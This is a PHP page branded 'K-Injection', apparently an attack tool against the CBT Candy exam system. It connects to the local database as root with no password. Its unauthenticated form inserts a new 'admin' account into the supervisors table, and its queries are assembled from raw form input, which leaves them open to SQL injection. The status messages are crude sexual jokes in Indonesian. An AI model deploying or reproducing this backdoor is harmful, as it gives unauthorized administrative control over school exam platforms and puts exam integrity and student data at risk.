<?php
error_reporting(E_ALL ^ E_NOTICE);
    $servername = "localhost";
    $database = "cbtcandy25";
    $username = "root";
    $password = "";

    // untuk tulisan bercetak tebal silakan sesuaikan dengan detail database Anda
    // membuat koneksi
    $koneksi = mysqli_connect($servername, $username, $password, $database);
    // mengecek koneksi
    if (!$koneksi) {
        $stat = "<span class='badge bg-danger'>Koneksi Gagal</span>";
        die(mysqli_connect_error());
    }
    $stat = "<span class='badge bg-success'>Koneksi Berhasil</span>";
    if (isset($_POST['submit'])) :
        $nip = $_POST['nip'];
        $nama = $_POST['nama'];
        $nama = str_replace("'", "&#39;", $nama);
        $username = $_POST['username'];
        $pass1 = $_POST['pass1'];
        $pass2 = $_POST['pass2'];

        $cekuser = mysqli_num_rows(mysqli_query($koneksi, "SELECT * FROM pengawas WHERE username='$username'"));
        if ($cekuser > 0) {
            $info = '<div class="alert alert-danger d-flex align-items-center" role="alert">
            <svg class="bi flex-shrink-0 me-2" width="24" height="24" role="img" aria-label="Danger:"><use xlink:href="#exclamation-triangle-fill"/></svg>
            <div>
            Username '.$username.' Udah gak perawan !
            </div>
            </div>';
        } else {
            if ($pass1 <> $pass2) :
                $info = '<div class="alert alert-danger d-flex align-items-center" role="alert">
                <svg class="bi flex-shrink-0 me-2" width="24" height="24" role="img" aria-label="Danger:"><use xlink:href="#exclamation-triangle-fill"/></svg>
                <div>
                Password tidak cocok !
                </div>
                </div>';
            else :
                $password = password_hash($pass1, PASSWORD_BCRYPT);
                $exec = mysqli_query($koneksi, "INSERT INTO pengawas (nip,nama,username,password,level) VALUES ('$nip','$nama','$username','$password','admin')");
                var_dump($exec);
                if (!$exec):
                    $info = '
                    <div class="alert alert-success d-flex align-items-center" role="alert">
                        <svg class="bi flex-shrink-0 me-2" width="24" height="24" role="img" aria-label="Danger:"><use xlink:href="#exclamation-triangle-fill"/></svg>
                        <div>
                            Gagal nembak dalem, kontolmu terlalu belok kekiri !
                        </div>
                    </div>';
                else:
                    $info = '
                    <div class="alert alert-success d-flex align-items-center" role="alert">
                        <svg class="bi flex-shrink-0 me-2" width="24" height="24" role="img" aria-label="Success:"><use xlink:href="#check-circle-fill"/></svg>
                        <div>
                            Mpshh Ahhh... Berhasil ngeCrott didalem, Semoga tidak hamil !
                        </div>
                    </div>';
                endif;
            
            endif;
        }
    endif;
    ?>

<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Karjok Injection</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  </head>
  <body>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
    <br>
    <center><img src="https://camo.githubusercontent.com/08ea818df2744098c3bfad4208c894b45a77dbbf855fcac6058c422a49ffba28/68747470733a2f2f632e74656e6f722e636f6d2f6b4f4d786f31493441563441414141432f6461726c696e672d696e2d7468652d6672616e78782d7a65726f2d74776f2e676966" alt="" style="width: 150px;"></center>
    <center><h1>K-Injection</h1></center>
    <center><h5>{ Karjok AdminCBT Injection }</h5></center>
    <center><p>Status : <?=$stat?></p></center>
    <div class="container">
        <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
        <symbol id="check-circle-fill" fill="currentColor" viewBox="0 0 16 16">
            <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z"/>
        </symbol>
        <symbol id="info-fill" fill="currentColor" viewBox="0 0 16 16">
            <path d="M8 16A8 8 0 1 0 8 0a8 8 0 0 0 0 16zm.93-9.412-1 4.705c-.07.34.029.533.304.533.194 0 .487-.07.686-.246l-.088.416c-.287.346-.92.598-1.465.598-.703 0-1.002-.422-.808-1.319l.738-3.468c.064-.293.006-.399-.287-.47l-.451-.081.082-.381 2.29-.287zM8 5.5a1 1 0 1 1 0-2 1 1 0 0 1 0 2z"/>
        </symbol>
        <symbol id="exclamation-triangle-fill" fill="currentColor" viewBox="0 0 16 16">
            <path d="M8.982 1.566a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767L8.982 1.566zM8 5c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995A.905.905 0 0 1 8 5zm.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2z"/>
        </symbol>
        </svg>

    <?=$info?>
        <div class="row justify-content-center align-items-center h-100">
            <div class="card" style="width: 18rem;">
                <div class="alert alert-primary d-flex align-items-center" role="alert">
                <svg class="bi flex-shrink-0 me-2" width="24" height="24" role="img" aria-label="Info:"><use xlink:href="#info-fill"/></svg>
                <div>
                <b>DATABASE</b>
                </div>
                </div>
                <ul class="list-group list-group-flush">
                    <li class="list-group-item">Server &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: localhost</li>
                    <li class="list-group-item">Username : root</li>
                    <li class="list-group-item">Password &nbsp;: </li>
                    <li class="list-group-item">DB Name &nbsp;: cbtcandy25</li>
                </ul>
            </div>
            <div class="col col-sm-8 col-md-8 col-lg-6 col-xl-3">
                <form action='' method='post'>
                    <div class="mb-1">
                        <label for="nip" class="form-label">NIP</label>
                        <input type='text' name='nip' for="nip" class='form-control' required='true' />
                    </div>
                    <div class="mb-1">
                        <label for="nama" class="form-label">Nama</label>
                        <input type='text' name='nama' for="nama" class='form-control' required='true' />
                    </div>
                    <div class="mb-1">
                        <label for="username" class="form-label">Username</label>
                        <input type='text' name='username' for="username" class='form-control' required='true' />
                    </div>
                    <div class='row'>
                        <div class='col'>
                            <label for="exampleInputPassword1" class="form-label">Password</label>
                            <input type='password' name='pass1' class='form-control' for="exampleInputPassword1" required='true' />
                        </div>
                        <div class='col'>
                            <label for="exampleInputPassword2" class="form-label">Ulang Password</label>
                            <input type='password' name='pass2' class='form-control' for="exampleInputPassword2" required='true' />
                        </div>
                    </div>
                    <br>
                    <button type='submit' name='submit' class='btn btn-sm btn-flat btn-primary'><i class='fa fa-check'></i> Tembak Dalem !</button>
                    <br>
                    <br>
                </form>
            </div>
        </div>
    </div>
  </body>
  <!-- Copyright -->
  <footer>
    <div class="text-center p-4" style="background-color: rgba(0, 0, 0, 0.05);">
        © 2022 Copyright:
        <a class="text-reset fw-bold" href="https://instagram.com/rezadkim.x"> @rezadkim.x</a>
    </div>
    <!-- Copyright -->
</footer>
</html>
